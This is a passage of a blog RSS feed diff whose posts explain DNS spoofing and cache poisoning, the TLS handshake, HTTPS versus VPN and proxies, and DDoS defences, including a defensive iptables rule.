+&lt;li&gt;&lt;strong&gt;Man-in-the-middle (MITM) attacks:&lt;/strong&gt; Attackers use &lt;a href=&#34;https://www.fortinet.com/resources/cyberglossary/man-in-the-middle-attack&#34;&gt;man-in-the-middle attack techniques&lt;/a&gt; to intercept communications between users and a &lt;a href=&#34;https://www.fortinet.com/resources/cyberglossary/dynamic-dns&#34;&gt;DNS server&lt;/a&gt;. They then direct the target to malicious websites.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Learn more &lt;a href=&#34;https://www.fortinet.com/resources/cyberglossary/dns-hijacking&#34;&gt;What Is DNS Hijacking? How to Detect &amp;amp; Prevent It | Fortinet&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;52-dns-spoofing-vs-dns-cache-poisoning&#34;&gt;5.2. DNS spoofing vs DNS (cache) poisoning&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DNS Poisoning&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Definition&lt;/strong&gt;: The attacker inserts false address records into the DNS server&amp;rsquo;s cache, causing the server to return incorrect IP addresses for domain names.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Target&lt;/strong&gt;: The attack is on the DNS server.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: If &lt;code&gt;www.example.com&lt;/code&gt; is supposed to resolve to IP &lt;code&gt;1.2.3.4&lt;/code&gt;, in a DNS poisoning attack, the DNS server might be tricked into resolving it to &lt;code&gt;5.6.7.8&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DNS Spoofing&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Definition&lt;/strong&gt;: The attacker intercepts and responds to DNS requests with false information, usually &lt;strong&gt;before&lt;/strong&gt; the legitimate response is received.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: When a user tries to access &lt;code&gt;www.example.com&lt;/code&gt;, an attacker might intercept this request and send a fake response directing the user to IP &lt;code&gt;5.6.7.8&lt;/code&gt; instead of the real IP &lt;code&gt;1.2.3.4&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/005-gfw-dns/&#34;&gt;GFW and DNS Poisoning - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;53-others&#34;&gt;5.3. Others&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DNS Poisoning vs DNS Spoofing&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DNS Poisoning: Inject false DNS info to the real server&amp;rsquo;s cache.&lt;/li&gt;
+&lt;li&gt;DNS Spoofing: Send false response back with a malicious DNS server.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Purpose of MAC Address Spoofing&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;To make a switch forward packets to an attacker&amp;rsquo;s device by mimicking a legitimate MAC address.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Use of ICMP Redirects in Man-in-the-Middle Attacks&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;An attacker sends forged &amp;ldquo;ICMP redirect messages&amp;rdquo; to mislead a host into changing its routing table, diverting traffic through the attacker&amp;rsquo;s machine.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;6-xss-attack&#34;&gt;6. XSS Attack&lt;/h2&gt;
+&lt;p&gt;可以到 &lt;a href=&#34;https://jiyi27.com/post/networking/009-xss-attack/&#34;&gt;XSS 攻击&lt;/a&gt; 查看&lt;/p&gt;
+&lt;h2 id=&#34;7-缓存投毒&#34;&gt;7. 缓存投毒&lt;/h2&gt;
+&lt;p&gt;可以到 &lt;a href=&#34;https://jiyi27.com/post/networking/010-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/&#34;&gt;缓存投毒&lt;/a&gt; 查看&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>HTTPS 连接建立过程 (TLS 握手)</title>
+      <link>https://blog.jiyi27.com/posts/http/006-https-ssl/</link>
+      <pubDate>Sat, 07 Oct 2023 08:30:26 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/http/006-https-ssl/</guid>
+      <description>&lt;h2 id=&#34;1-http-vs-https&#34;&gt;1. HTTP vs HTTPS&lt;/h2&gt;
+&lt;p&gt;Strictly speaking, HTTPS is not a separate protocol, but refers to use of ordinary HTTP over an encrypted SSL/TLS connection.&lt;/p&gt;
+&lt;p&gt;Port 80 is typically used for unencrypted &lt;a href=&#34;https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol&#34;&gt;HTTP&lt;/a&gt; traffic while port 443 is the common port used for encrypted HTTP traffic which is called  &lt;a href=&#34;https://en.wikipedia.org/wiki/HTTPS&#34;&gt;HTTPS&lt;/a&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Note that TLS is the successor of SSL, you can simply think they are same thing.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://en.wikipedia.org/wiki/HTTPS#Network_layers&#34;&gt;https://en.wikipedia.org/wiki/HTTPS#Network_layers&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-what-is-tlsssl&#34;&gt;2. What is TLS/SSL&lt;/h2&gt;
+&lt;p&gt;SSL (Secure Sockets Layer) and its successor, TLS (Transport Layer Security), are protocols for establishing &lt;em&gt;&lt;strong&gt;authenticated&lt;/strong&gt;&lt;/em&gt; and &lt;em&gt;&lt;strong&gt;encrypted&lt;/strong&gt;&lt;/em&gt; links between networked computers.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-http-vs-https&#34;&gt;1. HTTP vs HTTPS&lt;/h2&gt;
+&lt;p&gt;Strictly speaking, HTTPS is not a separate protocol, but refers to use of ordinary HTTP over an encrypted SSL/TLS connection.&lt;/p&gt;
+&lt;p&gt;Port 80 is typically used for unencrypted &lt;a href=&#34;https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol&#34;&gt;HTTP&lt;/a&gt; traffic while port 443 is the common port used for encrypted HTTP traffic which is called  &lt;a href=&#34;https://en.wikipedia.org/wiki/HTTPS&#34;&gt;HTTPS&lt;/a&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Note that TLS is the successor of SSL, you can simply think they are same thing.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://en.wikipedia.org/wiki/HTTPS#Network_layers&#34;&gt;https://en.wikipedia.org/wiki/HTTPS#Network_layers&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-what-is-tlsssl&#34;&gt;2. What is TLS/SSL&lt;/h2&gt;
+&lt;p&gt;SSL (Secure Sockets Layer) and its successor, TLS (Transport Layer Security), are protocols for establishing &lt;em&gt;&lt;strong&gt;authenticated&lt;/strong&gt;&lt;/em&gt; and &lt;em&gt;&lt;strong&gt;encrypted&lt;/strong&gt;&lt;/em&gt; links between networked computers.&lt;/p&gt;
+&lt;p&gt;HTTPS, HTTP, and TLS are all protocols. HTTPS utilizes the encryption and digital authentication provided by SSL/TLS, while SSL/TLS utilizes some cryptographic algorithms within the protocol in different phases, such as RSA is used at session key exchange stage, AES is used during data transfer. Encryption can be further divided into two types:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Symmetric Encryption Algorithms: AES, etc.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Asymmetric Encryption Algorithms (public key cryptography): RSA, ECC, etc.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;3-the-process-of-establishing-a-https-connection&#34;&gt;3. The process of establishing a HTTPS connection&lt;/h2&gt;
+&lt;p&gt;When we click a link on our browser will send a or multiple http requets to the target server, then the server will respond us with html file or some images or other resources. But transfer data there are other things needed to do under the hood:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A tcp connection needed to be established (envolves three way handshake).&lt;/li&gt;
+&lt;li&gt;Make a &lt;a href=&#34;https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/&#34;&gt;TLS handshake&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;After TLS handshake,  the secure communication begins (client makes http request, server makes response).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;During the TLS handshake, the client generates a session key and encrypts it with the public key of the server and then send the encrypted session key string to the server, then the server decrypt this  string to get the actual session key. Then they make communication with this session key. Now you should understand why I say TLS/SSL use both RSA and AES encryption algorithms at different phrases in previous part.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Note that SSL/TLS is a stateful protocol, whereas HTTP/HTTPS is a stateless protocol.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;TLS/SSL is stateful.&lt;/strong&gt; The web server and the client (browser) cache the session including the cryptographic keys to improve performance and do &lt;strong&gt;not&lt;/strong&gt; perform key exchange for every request. &lt;a href=&#34;https://stackoverflow.com/a/33681674/16317008&#34;&gt;Source&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;4-details-in-tls-handshake&#34;&gt;4. Details in TLS handshake&lt;/h2&gt;
+&lt;p&gt;I have talked man-in-middle attack in other &lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/002-ssh/&#34;&gt;post&lt;/a&gt;, when a ssh connection is being established at the first time, it will notify us the fingerprint of the server which enables us can make sure to we are connecting the right server. But it&amp;rsquo;s a little diffenent in SSL/TLS (HTTPS). The authenciation happens in the TLS handshake, the authenciation here means to prevent man-in-the-middle attack by verifying the identity of the remote server.&lt;/p&gt;
+&lt;p&gt;The protocols use a handshake with an &lt;a href=&#34;https://en.wikipedia.org/wiki/Asymmetric_cipher&#34;&gt;asymmetric cipher&lt;/a&gt; to establish not only cipher settings but also a session-specific shared key with which further communication is encrypted using a &lt;a href=&#34;https://en.wikipedia.org/wiki/Symmetric_cipher&#34;&gt;symmetric cipher&lt;/a&gt;. During this handshake, the client and server agree on various parameters used to establish the connection&amp;rsquo;s security:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;客户端跟对方说：&amp;ldquo;你好，我想安全地聊天，我可以用这些加密方式&amp;hellip;&amp;rdquo;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;对方回应：&amp;ldquo;好的，那我们就用这种加密方式吧&amp;rdquo;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;对方给你看他的 TLS 数字证书, 这个身份证上有：他的名字、公开的联系方式（公钥）、以及一个权威机构（CA）的盖章.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;浏览器验证证书是不是真的&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;建立专属密码阶段 客户端随机生成一个随机数,&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;方式一：客户端随机生成一个随机数, 用对方的公开联系方式（公钥）加密后发给他&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;方式二：你们俩一起用一个特殊的数学方法（Diffie-Hellman）, 各自算出一个相同的暗号&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;你们用刚才约定的暗号加密之后的所有对话&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;最开始 (握手阶段) 用的是不对称加密, 之后实际传输数据是对称加密&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://en.wikipedia.org/wiki/Transport_Layer_Security&#34;&gt;https://en.wikipedia.org/wiki/Transport_Layer_Security&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/&#34;&gt;https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;5-two-ways-to-get-ssltls-certificate&#34;&gt;5. Two ways to get SSL/TLS certificate&lt;/h2&gt;
+&lt;p&gt;There are several ways to obtain an SSL/TLS certificate:&lt;/p&gt;
+&lt;p&gt;Purchase from a Certificate Authority (CA): Trusted CAs offer various types of certificates, such as domain validation (DV), organization validation (OV), and extended validation (EV). A CA is an outside organization, a trusted third party, that generates and gives out SSL certificates. The CA will also digitally sign the certificate with their own private key, &lt;strong&gt;allowing client devices to verify it&lt;/strong&gt;. Once the certificate is issued, it needs to be installed and activated on the website&amp;rsquo;s origin server.&lt;/p&gt;
+&lt;p&gt;Technically, anyone can create their own SSL certificate by generating a public-private key pairing and including all the information mentioned above . Such certificates are called self-signed certificates because the digital signature used, instead of being from a CA, would be the website&amp;rsquo;s own private key. While self-signed certificates provide encryption for your website or application, they are not trusted by default by web browsers or other client applications. Therefore, visitors accessing your site will typically see a warning message stating that the certificate is not trusted. Learn more: &lt;a href=&#34;https://stackoverflow.com/questions/10175812/how-to-generate-a-self-signed-ssl-certificate-using-openssl&#34;&gt;How to generate a self-signed SSL certificate using OpenSSL?&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;6-is-https-secure-enough&#34;&gt;6. Is HTTPS secure enough?&lt;/h2&gt;
+&lt;p&gt;Does an established HTTPS connection mean the line is really secure?&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s important to understand what SSL does and does not do, especially since this is a very common source of misunderstanding.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;It encrypts the channel&lt;/li&gt;
+&lt;li&gt;It applies integrity checking&lt;/li&gt;
+&lt;li&gt;It provides authentication&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;So, the quick answer should be: &amp;ldquo;yes, it is secure enough to transmit sensitive data&amp;rdquo;. However, things are not that simple. There are a few issues here, &lt;strong&gt;the major one being authentication&lt;/strong&gt;. Both ends need to be sure they are talking to the right person or institution and no man-in-the-middle attack or CSRF attacks.&lt;/p&gt;
+&lt;p&gt;HTTPS is secure in encryption. HTTPS is secure itself but if we can totally trust HTTPS connection when exhcange privacy data is another thing. Although &lt;strong&gt;no one can decrept the data without the session key&lt;/strong&gt;, there probably have man-in-the-middle attck or CSRF attck needs to be considered which make the hackers get your money without getting your sensitive data . If you can make sure the client is really that people you want talk as a server or you can make sure the server is the correct server you want to get, then https is safe. Can you make sure the server itself is a bad company? Which will sell your personal data to other perople. But this is another topic, haha, In the last I&amp;rsquo;ll share a &lt;a href=&#34;https://stackoverflow.com/a/5310027/16317008&#34;&gt;answer&lt;/a&gt; here which is very comprehensive:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Question:&lt;/strong&gt; Consider a scenario, where user authentication (username and password) is entered by the user in the page&amp;rsquo;s form element, which is then submitted. The POST data is sent via HTTPS to a new page (where the php code will check for the credentials). If a hacker sits in the network, and say has access to all the traffic, is the Application layer security (HTTPS) enough in this case ?&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://stackoverflow.com/a/5310032/16317008&#34;&gt;Answer 1&lt;/a&gt;:&lt;/strong&gt; Yes. In an HTTPS only the handshake is done unencrypted, but even the HTTP GET/POST query&amp;rsquo;s are done encrypted.&lt;/p&gt;
+&lt;p&gt;It is however impossible to hide to what server you are connecting, since he can see your packets he can see the IP address to where your packets go. If you want to hide this too you can use a proxy (though the hacker would know that you are sending to a proxy, but not where your packets go afterwards).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://stackoverflow.com/a/5310288/16317008&#34;&gt;Answer 2&lt;/a&gt;:&lt;/strong&gt; HTTPS is sufficient &amp;ldquo;if&amp;rdquo; the client is secure. Otherwise someone can install a custom certificate and play man-in-the-middle.&lt;/p&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://security.stackexchange.com/questions/5/does-an-established-https-connection-mean-a-line-is-really-secure&#34;&gt;Does an established HTTPS connection mean a line is really secure? - Information Security Stack Exchange&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/5309997/post-data-encryption-is-https-enough&#34;&gt;php - POST data encryption - Is HTTPS enough? - Stack Overflow&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>HTTPS vs VPN vs Proxy</title>
+      <link>https://blog.jiyi27.com/posts/http/006-https-vpn/</link>
+      <pubDate>Sun, 10 Sep 2023 10:54:30 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/http/006-https-vpn/</guid>
+      <description>&lt;p&gt;HTTPS is used for encryption, VPN is too. What&amp;rsquo;s difference?&lt;/p&gt;
+&lt;p&gt;In previou post we talked about &lt;a href=&#34;&#34;&gt;Is HTTPS Secure Enough?&lt;/a&gt;, and we concluded that https is secure itself which means no one can decrypt the data without the session key. However there still are some security issues in HTTPS, the man-in-the-middle attack, for example.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Why do I need a VPN if https connections are secure?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A VPN will secure all of the traffic between point A and point B in a tunnel. This helps ensure that you are not having your traffic intercepted by anyone at, say, the coffee shop.&lt;/p&gt;</description>
+      <content>&lt;p&gt;HTTPS is used for encryption, VPN is too. What&amp;rsquo;s difference?&lt;/p&gt;
+&lt;p&gt;In previou post we talked about &lt;a href=&#34;&#34;&gt;Is HTTPS Secure Enough?&lt;/a&gt;, and we concluded that https is secure itself which means no one can decrypt the data without the session key. However there still are some security issues in HTTPS, the man-in-the-middle attack, for example.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Why do I need a VPN if https connections are secure?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A VPN will secure all of the traffic between point A and point B in a tunnel. This helps ensure that you are not having your traffic intercepted by anyone at, say, the coffee shop.&lt;/p&gt;
+&lt;p&gt;HTTPS is a secure protocol between your browser and a particular website.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Note that the tunnel in VPN is not a physical entity but rather a logical concept used to describe the secure pathway created for data transmission. Because tunneling involves repackaging the traffic data into a different form, perhaps with encryption as standard, it can hide the nature of the traffic that is run through a tunnel. &lt;a href=&#34;https://en.wikipedia.org/wiki/Tunneling_protocol&#34;&gt;Tunneling protocol&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This means the format of the packets transmitted between VPN clients and server are different from the format of OSI model, they are encapulated with tunneling protocol. Acts like your original packets transmitted in a magic container other people cannot know what&amp;rsquo;s in it. Acs like a tunnel.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;However, HTTPS will only help with traffic over port 443, which mean it only provides encryption for data exchanged between a client and a specific server, it does not encrypt all your internet traffic.&lt;/p&gt;
+&lt;p&gt;A VPN stops that because everything is connected securely through that pipe. The primary thing that a VPN helps with is what is know as a man in the middle attack: &lt;a href=&#34;https://en.wikipedia.org/wiki/Man-in-the-middle_attack&#34;&gt;Man-in-the-middle attack - Wikipedia&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;VPN vs Proxy&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;In computer networks, a proxy server is a server (a computer system or an application) that acts &lt;strong&gt;as an intermediary&lt;/strong&gt; for requests from clients seeking resources from other servers. &lt;a href=&#34;https://en.wikipedia.org/wiki/Proxy_server&#34;&gt;Proxy server&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A virtual private network (VPN) is an encrypted connection between two or more computers. VPN connections take place over public networks, but the data exchanged over the VPN is still private because it is encrypted. &lt;a href=&#34;https://www.cloudflare.com/learning/network-layer/what-is-ipsec/&#34;&gt;IPsec | Cloudflare&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;What a VPN does logically is turn your internet connection into a &lt;em&gt;big Ethernet cable&lt;/em&gt;. When you are logged on to a company&amp;rsquo;s VPN, the effect is similar as though you took your computer to the company&amp;rsquo;s building and directly connected it. VPNs (usually) use encryption so that intermediate systems between you and the company (such as your ISP or a malicious wireless network sniffer) cannot eavesdrop your traffic.&lt;/p&gt;
+&lt;p&gt;Proxies, on the other hand, do not typically provide encryption for all traffic and may only encrypt specific types of traffic (such as HTTPS).&lt;/p&gt;
+&lt;p&gt;Proxies generally work on specific types of application traffic. For example, there are HTTP proxies, DNS proxies, etc. Although there are SOCKS proxies that proxy everything&amp;hellip;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;How do sites like Netflix know I&amp;rsquo;m using a VPN?&lt;/p&gt;
+&lt;p&gt;This is often caused by many netflix uers use a same von to access thier streaming service.&lt;/p&gt;
+&lt;p&gt;We have known that: when you are logged on to a company&amp;rsquo;s VPN, the effect is similar as though you took your computer to the company&amp;rsquo;s building and directly connected it.&lt;/p&gt;
+&lt;p&gt;If eveybody drives the same car to Walmart, Walmart will sooner or later know it&amp;rsquo;s a rental car, but they cannot track this car back to you because everybody drives the car with same the plate.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://qr.ae/pyL1RD&#34;&gt;Why do I need VPN if https connections are secure? - Quora&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://superuser.com/questions/257388/what-is-the-difference-between-a-proxy-and-a-vpn&#34;&gt;security - What is the difference between a proxy and a VPN? - Super User&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.reddit.com/r/VPN/comments/5mh6uc/how_do_sites_like_netflix_know_im_using_a_vpn/&#34;&gt;How do sites like Netflix know I&amp;rsquo;m using a VPN? : VPN&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>DDoS Attack</title>
+      <link>https://blog.jiyi27.com/posts/networking/004-ddos-attack/</link>
+      <pubDate>Sat, 09 Sep 2023 09:29:57 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/004-ddos-attack/</guid>
+      <description>&lt;h2 id=&#34;1-ddos-attack&#34;&gt;1. DDoS attack&lt;/h2&gt;
+&lt;p&gt;A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic.&lt;/p&gt;
+&lt;p&gt;When a DDoS attack happens, a large volume of traffic is sent to a website. The site under attack typically crashes because the increased traffic exhausts the bandwidth limit or overloads the website’s servers.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-ddos-attack&#34;&gt;1. DDoS attack&lt;/h2&gt;
+&lt;p&gt;A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic.&lt;/p&gt;
+&lt;p&gt;When a DDoS attack happens, a large volume of traffic is sent to a website. The site under attack typically crashes because the increased traffic exhausts the bandwidth limit or overloads the website’s servers.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;div style=&amp;quot;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&amp;quot;&amp;gt;
+  &amp;lt;iframe allow=&amp;quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&amp;quot; allowfullscreen=&amp;quot;allowfullscreen&amp;quot; loading=&amp;quot;eager&amp;quot; referrerpolicy=&amp;quot;strict-origin-when-cross-origin&amp;quot; src=&amp;quot;https://www.youtube.com/embed/7kB9-nQJR44?autoplay=0&amp;amp;amp;controls=1&amp;amp;amp;end=0&amp;amp;amp;loop=0&amp;amp;amp;mute=0&amp;amp;amp;start=0&amp;quot; style=&amp;quot;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&amp;quot; title=&amp;quot;YouTube video&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;video: &lt;a href=&#34;https://youtu.be/7kB9-nQJR44?si=R8qrLRhRwlqofAu5&#34;&gt;https://youtu.be/7kB9-nQJR44?si=R8qrLRhRwlqofAu5&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-how-does-a-ddos-attack-work&#34;&gt;2. How does a DDoS attack work?&lt;/h2&gt;
+&lt;p&gt;DDoS attacks are carried out with networks of Internet-connected machines.&lt;/p&gt;
+&lt;p&gt;These networks consist of computers and other devices (such as IoT devices)which have been infected with &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/malware/&#34;&gt;malware&lt;/a&gt;, allowing them to be controlled remotely by an attacker. These individual devices are referred to as &lt;a href=&#34;https://www.cloudflare.com/learning/bots/what-is-a-bot/&#34;&gt;bots&lt;/a&gt; (or zombies), and a group of bots is called a &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/what-is-a-ddos-botnet/&#34;&gt;botnet&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Once a botnet has been established, the attacker is able to direct an attack by sending remote instructions to each bot.&lt;/p&gt;
+&lt;p&gt;When a victim’s server or network is targeted by the botnet, each bot sends requests to the target’s &lt;a href=&#34;https://www.cloudflare.com/learning/dns/glossary/what-is-my-ip-address/&#34;&gt;IP address&lt;/a&gt;, potentially causing the server or network to become overwhelmed, resulting in a &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/denial-of-service/&#34;&gt;denial-of-service&lt;/a&gt; to normal traffic.&lt;/p&gt;
+&lt;p&gt;Because each bot is a legitimate Internet device, separating the attack traffic from normal traffic can be difficult.&lt;/p&gt;
+&lt;h2 id=&#34;3-how-to-identify-a-ddos-attack&#34;&gt;3. How to identify a DDoS attack&lt;/h2&gt;
+&lt;p&gt;The most obvious symptom of a DDoS attack is a site or service suddenly becoming slow or unavailable. But since a number of causes — such a legitimate spike in traffic — can create similar performance issues, further investigation is usually required. Traffic analytics tools can help you spot some of these telltale signs of a DDoS attack:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Suspicious amounts of traffic originating from a single IP address or IP range&lt;/li&gt;
+&lt;li&gt;A flood of traffic from users who share a single behavioral profile, such as device type, geolocation, or web browser version&lt;/li&gt;
+&lt;li&gt;An unexplained surge in requests to a single page or endpoint&lt;/li&gt;
+&lt;li&gt;Odd traffic patterns such as spikes at odd hours of the day or patterns that appear to be unnatural (e.g. a spike every 10 minutes)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;4-challenge-collapsar-cc-attack---ddos&#34;&gt;4. Challenge Collapsar (CC) attack - DDoS&lt;/h2&gt;
+&lt;p&gt;A Challenge Collapsar (CC) attack is an attack where standard HTTP requests are sent to a targeted web server frequently.&lt;/p&gt;
+&lt;p&gt;In 2004, a Chinese hacker nicknamed KiKi invented a hacking tool to send these kinds of requests to attack a NSFOCUS firewall named &lt;em&gt;Collapsar&lt;/em&gt;, and thus the hacking tool was known as &lt;em&gt;Challenge Collapsar&lt;/em&gt;, or &lt;em&gt;CC&lt;/em&gt; for short. Consequently, this type of attack got the name &lt;em&gt;CC attack&lt;/em&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;DDoS is not a specific attack, but a general term for a large types of attacks. There are dozens of types, and new attack methods are constantly being invented.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;41-intercept-cc-attack---intercept-http-request&#34;&gt;4.1. Intercept cc attack - intercept http request&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;(1) Hardware firewall&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Set a physical firewall before your server machine which used to filter request, this is best way but most expensive too.&lt;/p&gt;
+&lt;p&gt;**(2) Software firewall **&lt;/p&gt;
+&lt;p&gt;Almost all OS has firewall installed，Linux server usually use &lt;a href=&#34;https://wiki.archlinux.org/index.php/Iptables_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29&#34;&gt;iptables&lt;/a&gt;, intercept request from IP address  &lt;code&gt;1.2.3.4&lt;/code&gt;, for example:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ iptables -A INPUT -s 1.2.3.4 -j DROP
